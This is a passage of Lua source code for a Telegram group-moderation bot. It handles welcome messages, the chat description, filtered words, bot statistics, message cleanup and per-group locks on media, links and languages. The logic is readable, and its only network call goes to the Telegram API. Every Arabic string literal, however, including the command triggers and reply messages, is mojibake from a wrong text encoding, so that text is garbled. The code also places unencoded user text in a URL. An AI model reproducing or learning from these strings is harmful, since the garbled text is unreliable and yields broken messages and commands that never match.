Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุชุฑุญูุจ', 1, 'md')
Devmfm:del(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Devmfm:del(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ูููุดุฉ ุงูุชุฑุญูุจ', 1, 'md')
return false   
end
if text and text:match("^ุถุน ุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ูุถุน ุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุงุถู ุชุฑุญูุจ$") and ChCheck(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ูู ุงูุชุฑุญูุจ ุงูุงู\nโ๏ธุชุณุชุทูุน ุงุถุงูุฉ ูุงููู โซ โค\nโ๏ธุฏุงูุฉ ุนุฑุถ ุงูุงุณู โซ firstname\nโ๏ธุฏุงูุฉ ุนุฑุถ ุงููุนุฑู โซ username', 1, 'md')
Devmfm:set(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^ุญุฐู ุงูุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุญุฐู ุชุฑุญูุจ$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงูุชุฑุญูุจ")  
Devmfm:del(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^ุฌูุจ ุงูุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุฌูุจ ุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุงูุชุฑุญูุจ$") and ChCheck(msg) then
local wel = Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_)
if wel then
Dev_mfm(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ูุชู ูุถุน ุงูุชุฑุญูุจ \nโ๏ธุงุฑุณู โซ ุถุน ุชุฑุญูุจ ููุญูุธ ', 1, 'md')
end
end
if Devmfm:get(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุญูุธ ุงููุตู", 1, 'md')
Devmfm:del(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Devmfm:del(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชุบููุฑ ูุตู ุงููุฌููุนู', 1, 'md')
return false  
end 
if text and text:match("^ุถุน ูุตู$") and ChCheck(msg) or text and text:match("^ูุถุน ูุตู$") and ChCheck(msg) then  
Devmfm:set(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ูู ุงููุตู ุงูุงู', 1, 'md')
end
if text and text == "ููุน" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูู ุงููููู ุงูุงู", 1, 'md') 
Devmfm:set(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if Devmfm:get(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูููุน', 1, 'md')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ููุน ุงููููู โซ "..text, 1, 'html')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
Devmfm:hset(mustafa..'mfm:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "ุงูุบุงุก ููุน" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูู ุงููููู ุงูุงู", 1, 'md') 
Devmfm:set(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if Devmfm:get(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูุบุงุก ุงูููุน', 1, 'md')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not Devmfm:hget(mustafa..'mfm:Filters:'..msg.chat_id_, text) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงููููู โซ "..text.." ุบูุฑ ููููุนู", 1, 'html')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
Devmfm:hdel(mustafa..'mfm:Filters:'..msg.chat_id_, text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงููููู โซ "..text.." ุชู ุงูุบุงุก ููุนูุง", 1, 'html')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
if SudoBot(msg) then
if text and text == "ุงูุงุญุตุงุฆูุงุช" and ChCheck(msg) or text and text == "โซ ุงูุงุญุตุงุฆูุงุช โ" then
local gps = Devmfm:scard(mustafa.."mfm:Groups") local users = Devmfm:scard(mustafa.."mfm:Users") 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุญุตุงุฆูุงุช ุงูุจูุช โซ โค\nโ๏ธุนุฏุฏ ุงููุดุชุฑููู โซ โจ '..users..' โฉ\nโ๏ธุนุฏุฏ ุงููุฌููุนุงุช โซ โจ '..gps..' โฉ', 1, 'md')
end
if text and text == "ุงููุดุชุฑููู" and ChCheck(msg) or text and text == "โซ ุงููุดุชุฑููู โ" then
local users = Devmfm:scard(mustafa.."mfm:Users")
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฏุฏ ุงููุดุชุฑููู โซ โจ '..users..' โฉ', 1, 'md')
end
end
if text and text == 'ุงููุฌููุนุงุช' and ChCheck(msg) or text and text == 'โซ ุงููุฌููุนุงุช โ' then
if not SudoBot(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑูู ููุท ', 1, 'md')
else
local List = Devmfm:smembers(mustafa.."mfm:Groups")
local t = 'โ๏ธูุฌููุนุงุช ุงูุจูุช โซ โค \n'
for k,v in pairs(List) do
t = t..k.."~ : `"..v.."`\n" 
end
if #List == 0 then
t = 'โ๏ธูุง ููุฌุฏ ูุฌููุนุงุช ููุนูู'
end
Dev_mfm(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
if text and text:match('^ุชูุธูู (%d+)$') and ChCheck(msg) then  
if not Devmfm:get(mustafa..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^ุชูุธูู (%d+)$')) 
if Number > 1000 then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุงุชุณุชุทูุน ุชูุธูู ุงูุซุฑ ูู 1000 ุฑุณุงูู', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชูุธูู *'..Number..'* ูู ุงูุฑุณุงุฆู', 1, 'md')
Devmfm:setex(mustafa..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "ุชูุธูู ุงููุดุชุฑููู" and SecondSudo(msg) and ChCheck(msg) then 
local pv = Devmfm:smembers(mustafa.."mfm:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
Devmfm:srem(mustafa.."mfm:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ูุง ููุฌุฏ ูุดุชุฑููู ูููููู*', 1, 'md')
else
local ok = #pv - sendok
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฏุฏ ุงููุดุชุฑููู ุงูุงู โซ { '..#pv..' }\nโ๏ธุชู ุญุฐู โซ { '..sendok..' } ูู ุงููุดุชุฑููู\nโ๏ธุงูุนุฏุฏ ุงูุญูููู ุงูุงู  โซ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
if text == "ุชูุธูู ุงููุฑูุจุงุช" and SecondSudo(msg) and ChCheck(msg) or text == "ุชูุธูู ุงููุฌููุนุงุช" and SecondSudo(msg) and ChCheck(msg) then 
local group = Devmfm:smembers(mustafa.."mfm:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
changeChatMemberStatus(group[i], mustafa, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธ*ูุงุชูุฌุฏ ูุฌููุนุงุช ููููู*', 1, 'md')   
else
local mustafagp2 = (w + q)
local mustafagp3 = #group - mustafagp2
if q == 0 then
mustafagp2 = ''
else
mustafagp2 = '\nโ๏ธุชู ุญุฐู โซ { '..q..' } ูุฌููุนู ูู ุงูุจูุช'
end
if w == 0 then
mustafagp1 = ''
else
mustafagp1 = '\nโ๏ธุชู ุญุฐู โซ { '..w..' } ูุฌููุนู ุจุณุจุจ ุชูุฒูู ุงูุจูุช ุงูู ุนุถู'
end
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุนุฏุฏ ุงููุฑูุจุงุช ุงูุงู โซ { '..#group..' }'..mustafagp1..''..mustafagp2..'\nโ๏ธุงูุนุฏุฏ ุงูุญูููู ุงูุงู  โซ ( '..mustafagp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
if text == "ุชูุนูู ุงูุณุญ" and Constructor(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุณุญ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Clean'..msg.chat_id_,true)  
end
if text == "ุชุนุทูู ุงูุณุญ" and Constructor(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุณุญ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Clean'..msg.chat_id_) then 
if text == "ุงูููุฏูุง" and ChCheck(msg) or text == "ุนุฏุฏ ุงูููุฏูุง" and ChCheck(msg) then 
local M = Devmfm:scard(mustafa.."mfm:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุนุฏุฏ ุงูููุฏูุง โซ "..M, 1, 'md') 
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุงุชูุฌุฏ ููุฏูุง ููุง", 1, 'md') 
end end
if text == "ุงูุณุญ" and ChCheck(msg) or text == "ุชูุธูู ููุฏูุง" and ChCheck(msg) or text == "ุชูุธูู ุงูููุฏูุง" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."mfm:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
if Del ~= 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู "..Del.." ูู ุงูููุฏูุง", 1, 'md') 
Devmfm:del(mustafa.."mfm:cleaner"..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุงุชูุฌุฏ ููุฏูุง ููุง", 1, 'md') 
end end 
end
end
if Admin(msg) then
if text == "ุชูุธูู ุชุนุฏูู" or text == "ุชูุธูู ุงูุชุนุฏูู" and ChCheck(msg) then   
mfm_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
mfm_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = mfm_Del},function(arg,data)
new = 0
mfm_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
mfm_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,mfm_Del2)
end,nil)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชูุธูู 100 ูู ุงูุฑุณุงุฆู ุงููุนุฏูู', 1, 'md')
end
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^ูุชุญ (.*)$") then
local UnLockText = {string.match(text, "^(ูุชุญ) (.*)$")}
if UnLockText[2] == "ุงูุชุนุฏูู" then
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุชุนุฏูู")  
Devmfm:del(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุชุนุฏูู ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุชุนุฏูู ุงูููุฏูุง" or UnLockText[2] == "ุชุนุฏูู ุงูููุฏูุง" then
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุชุนุฏูู ุงูููุฏูุง")  
Devmfm:del(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชุนุฏูู ุงูููุฏูุง ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุงุฑุณูู" then
if Devmfm:get(mustafa..'mfm:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููุงุฑุณูู")  
Devmfm:del(mustafa..'mfm:Lock:Farsi'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุฑุณูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุดุงุฑ" then
if not Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููุดุงุฑ")  
Devmfm:set(mustafa..'mfm:Lock:Fshar'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุดุงุฑ ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุทุงุฆููู" then
if not Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุทุงุฆููู")  
Devmfm:set(mustafa..'mfm:Lock:Taf'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุทุงุฆููู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุฑ" then
if not Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูููุฑ")  
Devmfm:set(mustafa..'mfm:Lock:Kfr'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุฑ ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุงุฑุณูู ุจุงูุทุฑุฏ" then
if Devmfm:get(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููุงุฑุณูู ุจุงูุทุฑุฏ")  
Devmfm:del(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุฑุณูู ุจุงูุทุฑุฏ ุจุงููุนู ููุชูุญู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุจูุชุงุช" or UnLockText[2] == "ุงูุจูุชุงุช ุจุงูุทุฑุฏ" or UnLockText[2] == "ุงูุจูุชุงุช ุจุงูุชูููุฏ" or UnLockText[2] == "ุงูุจูุชุงุช ุจุงูุชููุฏ" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุจูุชุงุช")  
Devmfm:del(mustafa.."mfm:Lock:Bots"..msg.chat_id_)  
end
if UnLockText[2] == "ุงูุชูุฑุงุฑ" then 
Devmfm:hdel(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุชูุฑุงุฑ")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "ุงูุชุซุจูุช" then
if Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุชุซุจูุช")  
Devmfm:del(mustafa..'mfm:Lock:Pin'..msg.chat_id_)
Devmfm:srem(mustafa.."mfm:Lock:Pinpin",msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุชุซุจูุช ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end end end
end
end
if Admin(msg) then
if text and text:match("^ููู (.*)$") then
local LockText = {string.match(text, "^(ููู) (.*)$")}
if LockText[2] == "ุงูุฏุฑุฏุดู" then
if not Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุฏุฑุฏุดู")  
Devmfm:set(mustafa..'mfm:Lock:Text'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุฏุฑุฏุดู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงูููุงูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุงูููุงูู")  
Devmfm:set(mustafa..'mfm:Lock:Inline'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงูููุงูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุตูุฑ" then
if not Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุตูุฑ")  
Devmfm:set(mustafa..'mfm:Lock:Photo'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุตูุฑ ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุงูุด" then
if not Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูููุงูุด")  
Devmfm:set(mustafa..'mfm:Lock:Spam'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุงูุด ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุฏุฎูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุฏุฎูู")  
Devmfm:set(mustafa..'mfm:Lock:Join'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุฏุฎูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุฏูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูููุฏูู")  
Devmfm:set(mustafa..'mfm:Lock:Videos'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุฏูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุชุญุฑูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููุชุญุฑูู")  
Devmfm:set(mustafa..'mfm:Lock:Gifs'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุชุญุฑูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงุบุงูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุงุบุงูู")  
Devmfm:set(mustafa..'mfm:Lock:Music'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงุบุงูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุตูุช" then
if not Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุตูุช")  
Devmfm:set(mustafa..'mfm:Lock:Voice'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุตูุช ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุฑูุงุจุท" then
if not Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุฑูุงุจุท")  
Devmfm:set(mustafa..'mfm:Lock:Links'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุฑูุงุจุท ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุงูุน" then
if not Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูููุงูุน")  
Devmfm:set(mustafa..'mfm:Lock:Location'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุงูุน ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุนุฑู" or LockText[2] == "ุงููุนุฑูุงุช" then
if not Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููุนุฑูุงุช")  
Devmfm:set(mustafa..'mfm:Lock:Tags'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุนุฑูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููููุงุช" then
if not Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููููุงุช")  
Devmfm:set(mustafa..'mfm:Lock:Document'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููููุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุงุดุชุงู" or LockText[2] == "ุงูุชุงู" then
if not Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููุงุดุชุงู")  
Devmfm:set(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุดุชุงู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุฌูุงุช" then
if not Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุฌูุงุช")  
Devmfm:set(mustafa..'mfm:Lock:Contact'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '๏ธโ๏ธุงูุฌูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุดุจูุงุช" then
if not Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุดุจูุงุช")  
Devmfm:set(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุดุจูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุนุฑุจูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุนุฑุจูู")  
Devmfm:set(mustafa..'mfm:Lock:Arabic'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุฑุจูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงููููุฒูู" then
if not Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุงููููุฒูู")  
Devmfm:set(mustafa..'mfm:Lock:English'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงููููุฒูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุตูุงุช" then
if not Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูููุตูุงุช")  
Devmfm:set(mustafa..'mfm:Lock:Stickers'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุตูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
